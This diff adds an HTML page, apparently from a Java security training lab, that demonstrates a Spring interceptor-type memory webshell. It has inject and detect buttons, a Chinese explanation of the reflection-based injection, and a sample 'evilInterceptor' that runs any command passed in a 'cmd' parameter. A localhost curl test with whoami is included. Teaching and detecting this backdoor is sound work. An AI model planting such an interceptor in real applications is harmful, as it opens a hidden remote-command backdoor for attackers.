@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<div th:replace="~{common/common::head}"></div>
+
+<body>
+<div class="layuimini-container">
+    <div class="layuimini-main">
+        <div class="layui-row layui-col-space15">
+            <!-- 标题和描述 -->
+            <div class="layui-col-md12">
+                <fieldset class="layui-elem-field layui-field-title">
+                    <legend>
+                        <a style="color: rgb(30 159 255)" class="memshell-info">内存马 - Spring拦截器型</a>
+                    </legend>
+                    <blockquote class="layui-elem-quote layui-quote-nm"
+                              style="font-size: 15px;background-color: #a7deefab;box-shadow: 0 .125rem .25rem rgba(0, 0, 0, .075) !important">
+                        <p>
+                        <pre>  Spring拦截器型内存马是一种通过动态注册HandlerInterceptor到Spring MVC中实现的内存马。它可以拦截所有HTTP请求，执行恶意代码。</pre>
+                        <pre>  注入原理：通过反射获取RequestMappingHandlerMapping中的adaptedInterceptors列表，向其中添加恶意拦截器，从而实现对所有请求的拦截。</pre>
+                        </p>
+                    </blockquote>
+                </fieldset>
+            </div>
+
+            <!-- 主要内容区域 -->
+            <div class="layui-col-md12">
+                <div class="layui-row layui-col-space15">
+                    <!-- 左侧：注入和检测 -->
+                    <div class="layui-col-md6">
+                        <div class="layui-card">
+                            <div class="layui-card-header"><i class="fa fa-bug icon-tip"></i>漏洞场景</div>
+                            <div class="layui-card-body">
+                                <div class="layui-tab layui-tab-brief">
+                                    <div class="layui-tab-content">
+                                        <!-- 注入表单 -->
+                                        <div class="layui-tab-item layui-show">
+                                            <form class="layui-form" lay-filter="interceptorForm">
+                                                <div class="layui-form-item">
+                                                    <label class="layui-form-label">URL Pattern</label>
+                                                    <div class="layui-input-block">
+                                                        <input type="text" name="pattern" value="/**" lay-verify="required" placeholder="请输入拦截路径" class="layui-input">
+                                                    </div>
+                                                </div>
+                                                <div class="layui-form-item">
+                                                    <label class="layui-form-label">命令参数</label>
+                                                    <div class="layui-input-block">
+                                                        <input type="text" name="cmdParam" value="cmd" lay-verify="required" placeholder="请输入命令参数名" class="layui-input">
+                                                    </div>
+                                                </div>
+                                                <div class="layui-form-item">
+                                                    <div class="layui-input-block" style="text-align: right;">
+                                                        <button class="layui-btn layui-btn-normal" lay-submit lay-filter="interceptorSubmit">
+                                                            <i class="layui-icon layui-icon-release"></i>注入内存马
+                                                        </button>
+                                                        <button type="button" class="layui-btn layui-btn-primary" id="detectBtn">
+                                                            <i class="layui-icon layui-icon-search"></i>检测内存马
+                                                        </button>
+                                                    </div>
+                                                </div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- 使用说明 -->
+                        <div class="layui-card" style="margin-top: 10px;">
+                            <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>使用说明</div>
+                            <div class="layui-card-body layui-text">
+                                <pre style="color: #28333e;font-size: 15px;">1. 设置拦截路径和命令参数名
+2. 点击"注入内存马"按钮进行注入
+3. 使用以下命令测试：
+   curl "http://localhost:8080/any/path?cmd=whoami"
+4. 点击"检测内存马"查看已注入的拦截器</pre>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 右侧：检测结果和代码 -->
+                    <div class="layui-col-md6">
+                        <div class="layui-card">
+                            <div class="layui-card-header"><i class="fa fa-terminal icon-tip"></i>检测结果</div>
+                            <div class="layui-card-body">
+                                <pre id="detectResult" class="layui-code" style="margin: 0;"></pre>
+                            </div>
+                        </div>
+
+                        <div class="layui-card" style="margin-top: 10px;">
+                            <div class="layui-card-header"><i class="fa fa-code icon-tip"></i>示例代码</div>
+                            <div class="layui-card-body">
+                                <pre class="layui-code" lay-title="Java" lay-skin="notepad">
+HandlerInterceptor evilInterceptor = new HandlerInterceptor() {
+    @Override
+    public boolean preHandle(HttpServletRequest request, 
+            HttpServletResponse response, Object handler) throws Exception {
+        String cmd = request.getParameter("cmd");
+        if (cmd != null) {
+            Process process = Runtime.getRuntime().exec(cmd);
+            // 处理命令输出...
+            return false;
+        }
+        return true;
+    }
+};</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script th:src="@{/layui/layui.js}"></script>
+<script>
+    layui.use(['form', 'layer', 'code'], function(){
+        var form = layui.form;
+        var layer = layui.layer;
+        var $ = layui.$;
+        
+        // 渲染代码高亮
+        layui.code({
+            about: false
+        });
+
+        // 注入操作
+        form.on('submit(interceptorSubmit)', function(data){
+            var loadingIndex = layer.load(1, {
+                shade: [0.1,'#fff']
+            });
+            
+            $.ajax({
+                url: '/mshell/interceptor/inject',
+                type: 'POST',
+                data: data.field,
+                success: function(res){
+                    layer.close(loadingIndex);
+                    if(res.code === 0){
+                        layer.msg('内存马注入成功', {icon: 1});
+                    } else {
+                        layer.msg('注入失败：' + res.msg, {icon: 2});
+                    }
+                },
+                error: function(){
+                    layer.close(loadingIndex);
+                    layer.msg('请求失败', {icon: 2});
+                }
+            });
+            return false;
+        });
+
+        // 检测操作
+        $('#detectBtn').on('click', function(){
+            var loadingIndex = layer.load(1, {
+                shade: [0.1,'#fff']
+            });
+            
+            $.ajax({
+                url: '/mshell/interceptor/detect',
+                type: 'GET',
+                success: function(res){
+                    layer.close(loadingIndex);
+                    if(res.code === 0){
+                        $('#detectResult').html(res.data.replace(/\n/g, '<br>'));
+                        layui.code();
+                    } else {
+                        layer.msg('检测失败：' + res.msg, {icon: 2});
+                    }
+                },
+                error: function(){
+                    layer.close(loadingIndex);
+                    layer.msg('请求失败', {icon: 2});
+                }
+            });
+        });
+
+        // 添加信息提示
+        $('.memshell-info').hover(function () {
+            $(this).css('cursor', 'pointer');
+            layer.tips('点击查看内存马原理图', this, {
+                tips: [1, '#0051ff'],
+                time: 2000
+            });
+        });
+
+        // 点击显示原理图
+        $('.memshell-info').on('click', function () {
+            layer.open({
+                type: 1,
+                title: false,
+                closeBtn: 1,
+                area: ['800px', '600px'],
+                shadeClose: true,
+                content: '<div style="text-align: center;"><img src="/static/images/vul/memshell/interceptor.png" style="max-width: 100%; max-height: 100%;"></div>'
+            });
+        });
+    });
+</script>
+</body>
+</html>
